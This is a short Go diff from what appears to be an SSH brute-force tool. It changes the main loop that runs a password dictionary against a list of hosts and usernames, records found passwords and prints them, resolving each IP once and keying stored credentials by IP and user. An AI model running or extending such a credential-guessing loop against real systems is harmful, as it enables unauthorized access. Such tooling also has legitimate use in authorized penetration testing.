@@ -55,8 +55,16 @@ func main() {
 				continue
 			}
 
+			// The IP is resolved first so that it doesn't have to be resolved again for every single password in the
+			// dictionary
+			ip, err := host.ResolveIP()
+			if err != nil {
+				log.Println(err.Error())
+				continue
+			}
+
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
-			pwd, err := sshatk.SSHDict(host.IP(), host.Username(), config.Port(), dict.Pwds(), config)
+			pwd, err := sshatk.SSHDict(ip, host.Username(), config.Port(), dict.Pwds(), config)
 			if err != nil {
 				log.Println(err.Error())
 				continue
@@ -76,13 +84,22 @@ func main() {
 		for i, host := range hosts {
 			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hosts))*100)))
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
-			pwd, err := sshatk.SSHDict(host.IP(), host.Username(), config.Port(), dict.Pwds(), config)
+
+			// The IP is resolved first so that it doesn't have to be resolved again for every single password in the
+			// dictionary
+			ip, err := host.ResolveIP()
+			if err != nil {
+				log.Println(err.Error())
+				continue
+			}
+
+			pwd, err := sshatk.SSHDict(ip, host.Username(), config.Port(), dict.Pwds(), config)
 			if err != nil {
 				log.Println(err.Error())
 				continue
 			}
 			fmt.Printf("Password of '%s' found: '%s'\n", host.Username()+"@"+host.IP(), pwd)
-			foundCredentials[host.IP()] = pwd
+			foundCredentials[host.IP()+"@"+host.Username()] = pwd
 		}
 
 		// Print all found combinations
